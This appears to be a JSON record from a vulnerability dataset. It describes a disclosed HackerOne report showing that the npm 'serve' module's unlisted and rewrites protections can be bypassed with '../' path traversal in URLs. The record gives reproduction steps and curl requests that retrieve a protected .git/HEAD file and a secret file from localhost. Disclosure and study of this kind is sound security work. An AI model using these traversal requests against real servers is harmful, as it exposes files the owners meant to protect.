@@ -1,0 +1,54 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "skyn3t ",
+    "title": "[serve] Access unlisted internal files/folders revealing sensitive information",
+    "content": "\nI would like to report sensitive information disclosure in serve.\nBypass of #308721 in ways.\nModule\nmodule name: serve\nversion: 10.1.1\nnpm page: `https://www.npmjs.com/package/serve\nModule Description\nAssuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.\nIt behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.\nFurthermore, it provides a neat interface for listing the directory's contents\nModule Stats\nweekly downloads\n138,377\nVulnerability\nVulnerability Description\nThe serve modules allows directory browsing and to serve static files through the browser.\nThe config options unlisted and rewrites can be used to tell the module which file or directory are forbidden and should not be served.\nrefer: https://github.com/zeit/serve-handler/issues/48\nThis rule can be bypassed using the technique below which can lead to sensitive information disclosure (An interesting example: https://smitka.me/).\nSteps To Reproduce:\nInstall serve\nCode 22 Bytes\n1$ npm install -g serve\nInside a project directory, initialise git and create 404.html.\nCode 74 Bytes\n1$ git init\n2$ echo \"404 Not Found\" > 404.html\n3$ echo \"secret text\" > secret\nAdd rule to ignore .git folder in serve.json\nCode 189 Bytes\n1{\n2    \"rewrites\": [\n3        { \"source\": \".git/**\", \"destination\": \"/404.html\" },\n4        { \"source\": \"secret\", \"destination\": \"/404.html\" }\n5      ],\n6    \"unlisted\": [\n7      \".git\"\n8    ]\n9  }\nStart serve in current directory.\nCode 584 Bytes\n1$ serve\n2INFO: Discovered configuration in `serve.json`\n3   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n4   \u2502                                               \u2502\n5   \u2502   Serving!                                    \u2502\n6   \u2502                                               \u2502\n7   \u2502   - Local:            http://localhost:5000   \u2502\n8   \u2502   - On Your Network:  http://127.0.1.1:5000   \u2502\n9   \u2502                                               \u2502\n10   \u2502   Copied local address to clipboard!          \u2502\n11   \u2502                                               \u2502\n12   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nNow, current directory will be served by serve with the exception of folder .git and file secret.\nIf we try to curl .gitor secret we get a Not Found error\nCode 128 Bytes\n1$ curl http://localhost:5000/.git --path-as-is     \n2404 Not Found\n3$ curl http://localhost:5000/secret --path-as-is\n4404 Not Found\nAlthough if we request any other url and then navigate back to the forbidden files/folders using ../ scheme, we are able to extract it's contents successfully.\nCode 152 Bytes\n1$ curl http://localhost:5000/any/../.git/HEAD --path-as-is\n2ref: refs/heads/master\n3$ curl http://localhost:5000/any/../secret --path-as-is   \n4secret text\nSupporting Material/References:\nUbuntu 16.04\nnode v11.3.0\nnpm 6.7.0\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nThe essentially bypasses the unlisted and rewrites files/folders feature and allows an attacker to read from a directory/file that the victim has not allowed access to.\nReferences:\nhttps://github.com/zeit/serve-handler#options\nhttps://github.com/zeit/serve-handler/issues/48\n\n",
+    "severity": [
+        9.3,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Information Exposure Through Directory Listing"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1549592520,
+    "report_url": "https://hackerone.com/reports/486933",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Install serve: `npm install -g serve`"
+        ],
+        [
+            2,
+            "Initialize git and create files: `git init`, `echo \"404 Not Found\" > 404.html`, `echo \"secret text\" > secret`"
+        ],
+        [
+            3,
+            "Create serve.json with rules to block access to .git and secret: `{\"rewrites\": [{ \"source\": \".git/**\", \"destination\": \"/404.html\" }, { \"source\": \"secret\", \"destination\": \"/404.html\" }], \"unlisted\": [\".git\"]}`"
+        ],
+        [
+            4,
+            "Start serve: `serve`"
+        ],
+        [
+            5,
+            "Attempt direct access to blocked resources: `curl http://localhost:5000/.git --path-as-is` (returns 404)"
+        ],
+        [
+            6,
+            "Bypass protection using path traversal: `curl http://localhost:5000/any/../.git/HEAD --path-as-is` (successfully retrieves content)"
+        ]
+    ],
+    "vuln_description": "The serve module fails to properly enforce access restrictions when path traversal sequences (../) are used in URLs, allowing attackers to bypass protections for unlisted files/directories and access sensitive information.",
+    "reason": "While the vulnerability involves understanding serve's configuration and path traversal techniques, the bypass method is straightforward once the basic protection mechanism is understood. The interaction between path normalization and access controls is a known weakness in many web servers.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
